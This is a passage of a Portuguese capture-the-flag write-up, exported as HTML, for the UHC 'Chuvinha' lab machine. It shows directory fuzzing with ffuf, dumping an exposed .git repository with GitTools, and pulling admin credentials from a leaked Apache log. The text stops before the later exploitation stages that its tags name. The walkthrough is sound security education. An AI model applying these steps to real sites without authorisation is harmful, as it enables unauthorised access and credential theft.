@@ -1,0 +1,726 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>UHCV16 (Classificatória) - Chuvinha </title><style>
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-454645 {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-454645_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-454645 {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-454645_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-454645 { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="cb70e862-bf9c-41b0-a69b-6db877ddd36f" class="page sans"><header><img class="page-cover-image" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/back.png" style="object-position:center 83.56%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/OpenPuff_1.png"/></div><h1 class="page-title">UHCV16 (Classificatória) - Chuvinha </h1><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesMultipleSelect"><path d="M4,3 C4,2.447715 4.447715,2 5,2 L12,2 C12.5523,2 13,2.447716 13,3 C13,3.55228 12.5523,4 12,4 L5,4 C4.447715,4 4,3.55228 4,3 Z M4,7 C4,6.447715 4.447715,6 5,6 L12,6 C12.5523,6 13,6.447716 13,7 C13,7.55228 12.5523,8 12,8 L5,8 C4.447715,8 4,7.55228 4,7 Z M4,11 C4,10.447715 4.447715,10 5,10 L12,10 C12.5523,10 13,10.447716 13,11 C13,11.55228 12.5523,12 12,12 L5,12 C4.447715,12 4,11.55228 4,11 Z M2,4 C1.44771525,4 1,3.55228475 1,3 C1,2.44771525 1.44771525,2 2,2 C2.55228475,2 3,2.44771525 3,3 C3,3.55228475 2.55228475,4 2,4 Z M2,8 C1.44771525,8 1,7.55228475 1,7 C1,6.44771525 1.44771525,6 2,6 C2.55228475,6 3,6.44771525 3,7 C3,7.55228475 2.55228475,8 2,8 Z M2,12 C1.44771525,12 1,11.5522847 1,11 C1,10.4477153 1.44771525,10 2,10 C2.55228475,10 3,10.4477153 3,11 C3,11.5522847 2.55228475,12 2,12 Z"></path></svg></span>vulns and exploitations</th><td><span class="selected-value select-value-color-yellow">Git</span><span class="selected-value select-value-color-yellow">Git Exposed</span><span class="selected-value select-value-color-purple">LIbrary Hijacking C</span><span class="selected-value select-value-color-green">Phar Desserealization</span></td></tr></tbody></table></header><div class="page-body"><figure id="9bc1f95d-da8c-4bc3-8969-f85554a02ffa" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/galinhalego.png"><img style="width:144px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/galinhalego.png"/></a></figure><h3 id="3e80eae0-3821-4d10-bfcc-ba6d63f57cd8" class="">Escrito por: Vinicius (big0us)<mark class="highlight-yellow"> </mark><mark class="highlight-teal"> </mark></h3><p id="f8575957-0df1-44e1-90a1-320eef2f9dfb" class="">Tenho 16 anos, jogo CTF faz 4 meses nas plataformas TryHackMe, HackTheBox, e também participo do UHC aos finais de semanas. Estou estudando bastante programação e segurança.</p><ul id="3a0df975-169f-4ba3-abc3-41d33b09ed9b" class="toggle"><li><details open=""><summary>Perfis</summary><figure id="c5420cad-0a82-4b0b-9f46-dbda90ec0e78"><a href="https://github.com/viniciuspereiras/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">viniciuspereiras - Overview</div><div class="bookmark-description">as vezes &quot;big0us&quot; for fun :). viniciuspereiras has one repository available. Follow their code on GitHub.</div></div><div class="bookmark-href"><img src="https://github.com/favicon.ico" class="icon bookmark-icon"/>https://github.com/viniciuspereiras/</div></div><img src="https://avatars2.githubusercontent.com/u/69733777?s=400&amp;u=0132e5e4a44d7bd0eb01176e2187618a1f7aa887&amp;v=4" class="bookmark-image"/></a></figure><figure id="b8702228-d245-42a2-b89f-6e2a41e67493"><a href="https://tryhackme.com/p/big0us" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">TryHackMe | big0us</div><div class="bookmark-description">TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!</div></div><div class="bookmark-href"><img src="https://assets.tryhackme.com/img/favicon.png" class="icon bookmark-icon"/>https://tryhackme.com/p/big0us</div></div><img src="https://tryhackme-images.s3.amazonaws.com/user-avatars/acbda194c8e42a3049fb6ffcbf6dc290.png" class="bookmark-image"/></a></figure><figure id="2b839a21-8c24-434c-bb18-ba46591ea292"><a href="https://www.hackthebox.eu/home/users/profile/406363" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Hack The Box :: Penetration Testing Labs</div><div class="bookmark-description">Login to the Hack The Box platform and take your pen-testing and cyber security skills to the next level!</div></div><div class="bookmark-href"><img src="https://www.hackthebox.eu/images/favicon.png" class="icon bookmark-icon"/>https://www.hackthebox.eu/home/users/profile/406363</div></div><img src="https://www.hackthebox.eu/images/favicon.png" class="bookmark-image"/></a></figure></details></li></ul><h1 id="574340f4-8fe0-4eed-ab32-1323679426ff" class="">Recon</h1><p id="5f5a897a-eeed-49d8-948e-e27ba4c22c0b" class="">(Não usei o nmap pois abri a máquina no meu computador, o nmap não apontaria nada demais se eu rodasse ele no UHCLabs ou no próprio dia do UHC)</p><figure id="adaa4e57-d99f-4491-9955-934ce104d0c2" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled.png"><img style="width:1365px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled.png"/></a></figure><p id="0d3313ed-e7bc-44e9-b46e-474aad5da767" class="">De início o site é um blog sobre hacking e possui alguns lugares para compra de cursos, incluindo ZAP LOCKING (trava zap)...</p><p id="a62be75c-af5e-433f-8b79-75e532040a40" class="">Dando uma olhada no site em busca de falhas e também no código fonte, a primeira coisa que eu tentei &quot;explorar&quot; foi um formulário de e-mail no final da página, em busca de alguns Comand Injections, Server-side Request Forgery e etc.</p><p id="036f9745-29c9-46f5-8ad0-2d2944c7a1d5" class="">
+</p><figure id="43a99d0c-f4c1-45e7-8579-1716e3da7054" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%201.png"><img style="width:529px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%201.png"/></a></figure><p id="1a973705-365b-4298-9155-aba7d23bc4b0" class="">Porém não encontrei nada. </p><p id="1bd674b1-0264-44e6-b4df-0216f6e66cb7" class="">Então segui e rodei um Fuzzing em busca de arquivos e diretórios no site, utilizei uma ferramenta chamada &quot;ffuf&quot;:</p><pre id="11e1ab09-af35-4ee2-9595-aaebe2ba4ce9" class="code"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u &#x27;http://127.0.0.1/FUZZ&#x27; -c</code></pre><figure id="bacfb988-024d-4266-967d-5a02f5ca7510" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%202.png"><img style="width:720px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%202.png"/></a></figure><p id="6583ce70-9af0-4cd0-86a7-7b65f92b5c3c" class="">Como está no comando acima eu utilizei a wordlist &quot;common.txt&quot; do repositório seclists no github. De início houve alguns retornos interessantes, eu poderia rodar outras wordlists, normalmente eu uso a &quot;common.txt, quickhits.txt e big.txt&quot;.</p><pre id="8dd36eca-4d20-429e-a23a-ccd2b3092ea5" class="code"><code>LICENSE                - Apenas uma licensa de código, muito comum em ctfs;
+admin.php              - Painel de administração, vamos voltar nele mais tarde;
+.hta                   - Arquivos do apache, status code 403 acesso negado!
+css                    - Pasta de arquivos do CSS, acesso negado!
+.git/HEAD              - &quot;.git&quot; exposed uma vulnerabilidade crítica;
+font                   - Arquivo de fontes, acesso negado!
+fonts                  - Arquivo de fontes, acesso negado!
+img                    - Uma pasta com as imagens do site, acesso negado!
+index.html             - Página incial do site;
+.htaccess              - Arquivos do apache, status code 403 acesso negado!
+js                     - Arquivos de javascript, acesso negado!
+.htpasswd              - Arquivos do apache, status code 403 acesso negado!
+server-status          - Script que verifica se o servidor está online, porém, status code 403 acesso negado!
+uploads                - Pasta de uploads, interessante... mas acesso negado.</code></pre><p id="98ede98c-2d97-425e-9b7b-9b0a892cadb7" class="">Na página /admin.php temos um redirect para /login.php onde existe formulário de login, podemos verificar se existe alguma forma de achar credenciais e fazer o login ou fazer algum tipo de bypass.</p><figure id="71c8d015-c4d1-4c4e-8c11-11dcad0327da" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%203.png"><img style="width:1365px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%203.png"/></a></figure><p id="8c888b43-f95e-41db-af71-f9025b8ba1e9" class="">
+</p><p id="7c545bc2-dbbd-4c7f-b10d-58c0560616c4" class="">Na página /.git parece que temos uma possível falha de &quot;git exposed&quot;, vamos verificar se é válida e se sim vamos explora-la.</p><p id="393d24c2-62ed-4e2c-8800-502226cc9341" class="">(Ao invés de entrar no &quot;/.git/HEAD&quot;  verifiquei o &quot;.git&quot;:</p><figure id="67ab557a-2a07-4e64-a3c0-0ff6ad7f0d62" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%204.png"><img style="width:1366px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%204.png"/></a></figure><p id="c28d2da7-914c-43de-9e1d-42adb2311fd6" class="">Temos uma página dizendo que não podemos acessar o .git, esse template é incomum de ver em páginas com .git exposto, ai deve ter algo, dando um Ctrl+U para verificar o código fonte da página acabei encontrando a primeira flag! (sempre é bom ler o código fonte das aplicações).</p><figure id="17889c34-1bea-4def-b997-9e2e4e945f4c" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%205.png"><img style="width:902px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%205.png"/></a></figure><p id="47f0516a-af49-4229-b00d-0cc3c230c1d1" class="">Agora as chances da exploração serem pela falha de git exposed aumentaram pelo fato da primeira flag estar lá.</p><p id="b8fa38c6-2ad9-4ced-b9c9-19ff99fed2f6" class="">Se o desenvolvedor utiliza o Git para controle de versões do site, lá ficariam localizados todos os arquivos do site, commits (pequenas notas sobre o que mudou de versão para versão) e etc, o /.git não deveria ser acessível pelo público. </p><h1 id="25cb82f1-9c17-4010-a5f3-9e5743c0a3ec" class="">Exploitation - Parte 1</h1><p id="c32685bc-2d0c-40c8-8616-3c799087118f" class="">Para explorar o Git Exposed existem duas formas, de forma manual, e usando algumas tools. Eu recomendo tentar fazer de forma manual, e depois rodar a Tool, para aprender o que realmente a Tool faz. Vou deixar um link onde existe um artigo sobre falha de Git Exposed e sobre como explorar de forma manual (<a href="https://medium.com/swlh/hacking-git-directories-e0e60fa79a36">https://medium.com/swlh/hacking-git-directories-e0e60fa79a36</a>).</p><p id="dd7c7ab8-da05-494f-99c8-7941975bb370" class="">Como disse acima vamos usar algumas ferramentas para essa exploração, no caso elas estão em um repositório do GitHub que tem o nome de GitTools (<a href="https://github.com/internetwache/GitTools">https://github.com/internetwache/GitTools</a>)</p><p id="ceeea52d-2643-4b5e-a9b9-dcbadd862e51" class="">Na verdade é um pacote com 3 scripts, vamos usar dois deles, o Dumper e o Extractor.</p><p id="a55b1409-9189-42b2-b4c9-fdb7bd94c3b8" class="">Primeiro o Dumper para dumpar as coisas que estão no Git da máquina. (o segundo argumento é a pasta para onde os arquivos vão, botei na pasta onde está o script de extrair os arquivos para facilitar).</p><pre id="9d53c43b-0f1f-428f-a313-598b749e58ee" class="code"><code>./gitdumper.sh &#x27;http://127.0.0.1/.git/&#x27; ~/Tools/GitTools/Extractor/dumpchuvinha</code></pre><figure id="5fc59e6f-c37c-42d5-bf53-c95f53e3eaf2" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%206.png"><img style="width:1362px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%206.png"/></a></figure><p id="24e5f9b3-f844-4914-896f-8ac420e93cc6" class="">Agora vamos para o diretório do Extractor e vamos extrair esse dump de arquivos para podermos ler:</p><pre id="1ba7d239-21d5-4107-85bf-bbd9139ecbad" class="code"><code>./extractor.sh dumpchuvinha extractchuvinha</code></pre><figure id="445d9abe-24ec-41ea-8cd6-af0d6a8a66b2" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%207.png"><img style="width:1363px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%207.png"/></a></figure><p id="0e4bd024-21ea-4ab6-b5e1-6c8bd2fee303" class="">Agora temos todos os arquivos do site na nossa maquina! </p><p id="8120b3e1-96ab-4daf-89da-02f4bdbe9832" class="">E parece que tem uma flag aqui hehe:</p><figure id="a6d67e5d-5713-42fb-a4c6-b2017e21f9d4" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%208.png"><img style="width:1343px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%208.png"/></a></figure><p id="bad07123-1ec8-4221-8b44-b2d0ac3e3a80" class="">Parece que teremos que fazer um code review...</p><p id="39b05170-5a86-42ba-958f-dc627558e988" class="">Vou abrir tudo no VisualStudioCode para facilitar.</p><p id="730b7929-3c8a-41ce-b5cf-948edb12d423" class="">
+</p><p id="de6b247a-012a-4255-92cc-6fcdcbbb7444" class="">Na primeira versão do site (/0-be7dbd2b1e15ffec896cf61484c5a89d18b77335) temos um arquivo de log do apache para ler.</p><figure id="29662467-1bab-4ec7-b75a-abd80d73fdbb" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%209.png"><img style="width:1193px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%209.png"/></a></figure><p id="5e13180b-01f9-481b-84cb-763c60087b6b" class="">São várias solicitações GET para o site que não aparentam ter nada de interessante, são tantas iguais o que me da a ideia de procurar por algo diferente em meio a todas essas iguais, dando um Ctrl+F para pesquisar dentro do arquivo, eu procuro por &quot;POST&quot; um outro método http, e incrivelmente eu encontro um request POST de uma autenticação, com credenciais para a página login.php, na fase de reconhecimento identificamos a página admin.php, muito provavelmente essas credenciais são do administrador do site.</p><figure id="151a93c2-c059-45f2-b4e6-149e94fd6e5f" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2010.png"><img style="width:864px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2010.png"/></a></figure><p id="d094c75d-6af0-4b4b-85d7-f8860b56d3ed" class="">Como é um request php parece que a senha está encodada em string de URL, vou utilizar um decoder de URL para arrumar isso.</p><figure id="5e11b73a-5360-4b7b-ab15-40dc0ddd0c34" class="image"><a href="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2011.png"><img style="width:875px" src="UHCV16%20(Classificato%CC%81ria)%20-%20Chuvinha%20cb70e862bf9c41b0a69b6db877ddd36f/Untitled%2011.png"/></a></figure><p id="fd897366-c9c6-4335-8dfc-5d815158c01d" class="">Ok, vamos testar essas credenciais!</p><p 